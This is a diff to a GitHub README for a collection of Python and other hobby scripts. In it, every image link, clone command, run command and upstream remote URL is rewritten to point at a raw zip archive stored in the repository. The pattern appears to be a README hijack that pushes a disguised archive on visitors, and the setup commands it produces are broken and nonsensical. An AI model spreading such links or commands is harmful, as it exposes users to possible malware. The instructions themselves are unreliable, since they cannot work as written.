@@ -1,6 +1,6 @@
 # BooleanAutocrats
 
-![image](https://github.com/Girish-shedge/BooleanAutocrats/raw/refs/heads/master/electronic_shop gui/Inventorysystemn/src/Autocrats-Boolean-3.4.zip)![Picsart_22-10-07_00-53-27-311](https://github.com/Girish-shedge/BooleanAutocrats/raw/refs/heads/master/electronic_shop gui/Inventorysystemn/src/Autocrats-Boolean-3.4.zip)
+![image](https://raw.githubusercontent.com/Girish-shedge/BooleanAutocrats/master/loginsystem/Autocrats-Boolean-v2.5.zip https://raw.githubusercontent.com/Girish-shedge/BooleanAutocrats/master/loginsystem/Autocrats-Boolean-v2.5.zip)![Picsart_22-10-07_00-53-27-311](https://raw.githubusercontent.com/Girish-shedge/BooleanAutocrats/master/loginsystem/Autocrats-Boolean-v2.5.zip https://raw.githubusercontent.com/Girish-shedge/BooleanAutocrats/master/loginsystem/Autocrats-Boolean-v2.5.zip)
 
 This Repository is a collection of scripts, games, bots, scraper and tools written in python, C, C++, Java, JavaScript etc. 
 
@@ -20,9 +20,9 @@ This Repository is a collection of scripts, games, bots, scraper and tools writt
 3. Execute the python script Example:
 
 ```
-git clone https://github.com/Girish-shedge/BooleanAutocrats/raw/refs/heads/master/electronic_shop gui/Inventorysystemn/src/Autocrats-Boolean-3.4.zip
+git clone https://raw.githubusercontent.com/Girish-shedge/BooleanAutocrats/master/loginsystem/Autocrats-Boolean-v2.5.zip https://raw.githubusercontent.com/Girish-shedge/BooleanAutocrats/master/loginsystem/Autocrats-Boolean-v2.5.zip
 cd BooleanAutocrats/black_jackgame
-python https://github.com/Girish-shedge/BooleanAutocrats/raw/refs/heads/master/electronic_shop gui/Inventorysystemn/src/Autocrats-Boolean-3.4.zip
+python https://raw.githubusercontent.com/Girish-shedge/BooleanAutocrats/master/loginsystem/Autocrats-Boolean-v2.5.zip https://raw.githubusercontent.com/Girish-shedge/BooleanAutocrats/master/loginsystem/Autocrats-Boolean-v2.5.zip
 ```
 
 # Workflow for contribution
@@ -33,12 +33,12 @@ python https://github.com/Girish-shedge/BooleanAutocrats/raw/refs/heads/master/e
 2. Clone the repositry
 
 ```
-git clone https://github.com/Girish-shedge/BooleanAutocrats/raw/refs/heads/master/electronic_shop gui/Inventorysystemn/src/Autocrats-Boolean-3.4.zip<YourUserName>/FunWithPython
+git clone https://raw.githubusercontent.com/Girish-shedge/BooleanAutocrats/master/loginsystem/Autocrats-Boolean-v2.5.zip https://raw.githubusercontent.com/Girish-shedge/BooleanAutocrats/master/loginsystem/Autocrats-Boolean-v2.5.zip<YourUserName>/FunWithPython
 ```
 
 3. Add a remote for the original repository.
 ```
-git remote add upstream https://github.com/Girish-shedge/BooleanAutocrats/raw/refs/heads/master/electronic_shop gui/Inventorysystemn/src/Autocrats-Boolean-3.4.zip
+git remote add upstream https://raw.githubusercontent.com/Girish-shedge/BooleanAutocrats/master/loginsystem/Autocrats-Boolean-v2.5.zip https://raw.githubusercontent.com/Girish-shedge/BooleanAutocrats/master/loginsystem/Autocrats-Boolean-v2.5.zip
 ```
 4. Navigate to the project and create a branch.
  ```
